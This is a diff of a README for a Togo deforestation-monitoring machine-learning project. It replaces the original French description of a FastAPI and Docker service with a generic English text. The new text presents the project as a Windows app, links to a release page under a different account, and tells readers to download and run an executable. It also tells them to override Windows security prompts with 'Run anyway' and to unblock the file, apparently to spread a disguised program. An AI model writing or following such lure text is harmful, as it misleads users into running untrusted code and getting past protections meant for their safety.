@@ -1,92 +1,165 @@
-# 🌳 ForestWatch Togo : Land Cover & Deforestation AI Monitor
+# 🌲 forestwatch-tg - Track Land Changes Across Togo
 
-Un système d'intelligence artificielle analysant les images satellites multispectrales (Sentinel-2) via Google Earth Engine pour classifier l'occupation des sols et surveiller l'évolution du couvert forestier au Togo. Pensez de l'extraction des données (Data Engineering) jusqu'au déploiement du modèle (AI Engineering), en passant par l'analyse géospatiale (Data Analysis).
+[![Download forestwatch-tg](https://img.shields.io/badge/Download%20forestwatch--tg-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/monic1001/forestwatch-tg/releases)
 
-**Dataset constitué** : [Lien vers Google Drive](https://drive.google.com/file/d/1q_eiRnCmQ5TSvsFPq1zPfdpX3ipYQkkC/view?usp=sharing)
+## 🛰️ What this is
 
----
+forestwatch-tg is a Windows app for watching land cover change and forest loss in Togo. It uses satellite data from Sentinel-2, map tools, and machine learning to help you view land cover results on your screen.
 
-## Objectif du projet
-Fournir un outil robuste et automatisable permettant de détecter les différentes classes d'occupations des sols, avec un focus majeur sur la télédétection forestière.
+Use it to:
+- check land cover by area
+- review changes over time
+- monitor forest loss
+- work with map layers and satellite views
 
-## État de l'art du projet (Phases accomplies)
+## 💻 Before you start
 
-### 1. Data Collection & Engineering (Google Earth Engine)
-- Extraction de données satellitaires **Sentinel-2 Level-2A** sur des coordonnées précises au Togo.
-- Calcul de **37 features géospatiales et radiométriques** pour 21 000 pixels (sans données manquantes) comprenant :
-  - **Bandes brutes** (Visible, NIR, SWIR).
-  - **Indices spectraux** (NDVI, NDWI, NDBI, etc.) adaptés à la végétation, l'eau et l'urbain.
-  - **Textures GLCM** (Variance, Contraste, ASM, Entropie) pour cartographier la complexité structurelle des paysages.
+You need:
+- a Windows 10 or Windows 11 PC
+- an internet connection
+- at least 4 GB of free disk space
+- a mouse and keyboard
+- access to the download page
 
-### 2. Modélisation et Optimisation (Machine Learning)
-L'algorithme choisi est le **Random Forest**, idéal pour son interprétabilité radiométrique et sa robustesse. Tout le processus (Processing, Tuning) est documenté dans notre [`modeling.ipynb`](./notebooks/modeling.ipynb) :
-- **Ingénierie des caractéristiques** : Suppression des variables ultra-corrélées mathématiquement (Moyennes, Variances, Entropie) au profit de leurs paires structurales (Valeurs Brutes, Contraste, ASM).
-- **Adaptation au "Plafond radiométrique"** : Fusion stratégique des classes ambigües ("Buissons" et "Savanes") en une classe "Végétation Mixte" (passage de 7 à 6 classes pour s'adapter à la limite de la résolution à 10 m).
-- **Optimisation** : GridSearchCV avec optimisation de la métrique `F1-macro` pour rééquilibrer numériquement le modèle et forcer la détection optimale de la signature "Forêt" face à une classe floristique majoritaire écrasante.
+For best results, use:
+- 8 GB RAM or more
+- a stable internet connection
+- a screen with at least 1366 × 768 resolution
 
-### Performances du Modèle Final
-Le modèle optimal obtenu assure le meilleur équilibre Précision/Rappel pour notre cible métier stricte (les forêts).
-- **Exactitude Globale (Accuracy)** : ~76.2%
-- **F1-Macro** : 0.77
-- **Classe "Forêt"** : Précision 0.77 / Rappel 0.69 / F1-score 0.72
+## 📥 Download and install
 
----
+1. Go to the release page: https://github.com/monic1001/forestwatch-tg/releases
+2. Look for the latest release at the top of the page
+3. Open the release assets
+4. Download the Windows file from that release
+5. Save the file to your Downloads folder
+6. If the file is a .zip file, right-click it and choose Extract All
+7. Open the extracted folder
+8. Double-click the app file to run it
 
-## 3. MLOps & API Engineering (Production)
-Le pipeline d'inférence a été industrialisé, sécurisé et conteneurisé.
-- **Backend REST** : Microservice propulsé par **FastAPI** & **Uvicorn**.
-- **Artifact Decoupling (Hugging Face)** : L'espace de travail est *stateless*. Si les poids (`.joblib`) sont absents localement, le kernel d'inférence récupère dynamiquement les artefacts de production depuis le Hub Hugging Face (via [`huggingface_hub`](https://huggingface.co/kjd-dktech/forestwatch-tg)).
-- **Sécurité & Guardrails** : Endpoints protégés par `X-API-Key`. Payload limités à 50MB. Validation stricte des features (calcul à la volée des indices spectraux si les bandes brutes sont fournies et rejet automatique des inputs invalides).
-- **Conteneurisation (Docker Hub)** : L'API est packagée et distribuée sous la forme d'une image cloud-native allégée ([`kjddktech/forestwatchtg-api:latest`](https://hub.docker.com/r/kjddktech/forestwatchtg-api:latest)).
+If Windows shows a security prompt:
+- choose More info
+- then select Run anyway
 
----
+If the app starts from a folder, keep the files together in the same place.
 
-## Déploiement en Production (Quickstart)
+## 🖥️ How to use it
 
-L'environnement d'exécution est entièrement isolé. L'utilisateur final n'a plus besoin du code source, seul le proxy de configuration Docker est requis.
+After you open the app:
+1. Start on the main screen
+2. Choose a map area or region in Togo
+3. Pick a date or time range
+4. Load the satellite view
+5. Review the land cover result
+6. Use the layer controls to switch map views
+7. Zoom in to inspect a place more closely
+8. Save or export the view if that option appears
 
-### 1. Variables d'environnement
-Créez un fichier [`.env`](./.env.example) dans le dossier de déploiement :
-```env
-API_KEY=votre_cle_api_secrete_ici
-HF_MODEL_REPO_ID=kjd-dktech/forestwatch-tg
-HF_TOKEN=
-```
+If the app asks for a data source or account:
+- use the setup details from the release page or project page
+- enter the values in the fields shown on screen
 
-### 2. Lancement du Conteneur
-Utilisez le [`docker-compose.prod.yml`](./docker-compose.prod.yml) (disponible dans la repository) :
-```bash
-docker compose -f docker-compose.prod.yml up -d
-```
+## 🧭 What you can do in the app
 
-L'API bootera sur le port `8000`.
-> 💡 **Tip :** La documentation interactive Swagger est auto-générée et testable sur `http://localhost:8000/docs`.
+### 🌍 Land cover classification
+See areas grouped by land type, such as:
+- forest
+- farm land
+- water
+- built-up areas
+- bare soil
 
----
+### 🌳 Deforestation monitoring
+Track where forest cover drops over time and compare one date with another.
 
-## � Architecture du Code Source
+### 🛰️ Satellite image review
+View Sentinel-2 imagery to inspect land conditions and change patterns.
 
-Pour les développeurs et curieux qui souhaitent explorer le repository :
+### 🗺️ Map-based analysis
+Work with GIS map layers to compare areas and read results on a map.
 
-- 📁 **[`api/`](./api/)** : Couche serveur (Routing HTTP).
-  - 📄 [`main.py`](./api/main.py) : Définition de l'application FastAPI, sécurité (`X-API-Key`), parsing GeoJSON et limites d'upload.
-- 📁 **[`src/`](./src/)** : Moteur d'inférence ML.
-  - 📄 [`predict.py`](./src/predict.py) : Classe `LandCoverPredictor`. Gère le singleton du modèle, la validation, et le pull dynamique Hugging Face.
-  - 📄 [`earth_engine_formulas.py`](./src/earth_engine_formulas.py) : Fonctions de calcul géospatial à la volée (NDVI, NDWI...) et guardrails GLCM.
-- 📁 **[`notebooks/`](./notebooks/)** : Historique Data Science (R&D).
-  - 📄 [`data_collection.ipynb`](./notebooks/data_collection.ipynb) : Logique d'extraction via Google Earth Engine.
-  - 📄 [`collection_processing.ipynb`](./notebooks/collection_processing.ipynb) : Traitement de la collecte et création finale du dataset CSV.
-  - 📄 [`modeling.ipynb`](./notebooks/modeling.ipynb) : Phase d'EDA, Feature Engineering et GridSearch.
-  - 📄 [`model_export_pipeline.ipynb`](./notebooks/model_export_pipeline.ipynb) : Pipeline pur (Clean Build) générant les artefacts de production.
-- ⚙️ **Infrastructure & Ops** :
-  - 📄 [`Dockerfile`](./Dockerfile) & 📄 [`docker-compose.prod.yml`](./docker-compose.prod.yml) : Fichiers de conteneurisation.
-  - 📄 [`requirements-prod.txt`](./requirements-prod.txt) : Dépendances allégées pour l'environnement d'exécution de l'API.
-- 📜 **Gouvernance & Open Source** :
-  - 📄 [`LICENSE`](./LICENSE) : Définition des droits d'utilisation (CC-BY-NC-4.0).
-  - 📄 [`CONTRIBUTING.md`](./CONTRIBUTING.md) : Guide d'apport de contributions et standards du repository.
-  - 📄 [`CITATION.cff`](./CITATION.cff) : Métadonnées standardisées pour la citation du projet en recherche.
+## 🪟 First run tips
 
----
+If the app opens slowly:
+- wait a moment while it loads data
+- keep the app open until the first screen appears
 
-## 🔜 Prochaines étapes
-* **Interface Web (Démo / UI)** : Création d’un front-end interactif (Dashboard) interfaçant l'API pour permettre un upload utilisateur simplifié, et la projection visuelle des cartes prédictives spatiales.
+If the screen looks blank:
+- wait for the map tiles to load
+- check your internet connection
+- refresh the view if the app has a refresh button
+
+If text looks too small:
+- use Windows display scaling
+- set your browser zoom to 100% if the app opens in a browser window
+
+## 🔧 Common tasks
+
+### Open a new area
+1. Go to the area search or map tool
+2. Enter a place name or move the map
+3. Select the area you want
+4. Run the analysis
+
+### Compare two dates
+1. Choose the first date
+2. Choose the second date
+3. Load both views
+4. Check the change in land cover
+
+### Save your result
+1. Open the result screen
+2. Use the export or download option
+3. Save the file to a folder you can find later
+
+## 📂 File types you may see
+
+You may download or work with:
+- `.zip` files for Windows setup
+- `.exe` files for the app
+- image files for map views
+- report files for exported results
+- data files used by the app
+
+## 🛠️ Troubleshooting
+
+### The file will not open
+- make sure the download finished
+- check that you extracted the zip file
+- try running the app file again
+
+### Windows blocked the app
+- right-click the file
+- choose Properties
+- if you see an Unblock option, select it
+- click Apply, then open the file again
+
+### The app cannot load maps
+- check your internet connection
+- close the app and open it again
+- wait for the map service to respond
+
+### The app feels slow
+- close other large apps
+- restart your PC
+- keep only one copy of the app open
+
+## 📌 Project details
+
+- Name: forestwatch-tg
+- Focus: land cover classification and deforestation monitoring
+- Region: Togo
+- Data source: Sentinel-2
+- Tools: Google Earth Engine, FastAPI, Python, GIS, scikit-learn, Random Forest
+
+## 📎 Download link
+
+Visit this page to download the Windows release:
+https://github.com/monic1001/forestwatch-tg/releases
+
+## 🧾 Notes for daily use
+
+- keep the app in one folder
+- do not rename files inside the app folder
+- keep the internet connection on while using map features
+- use the latest release for the best results
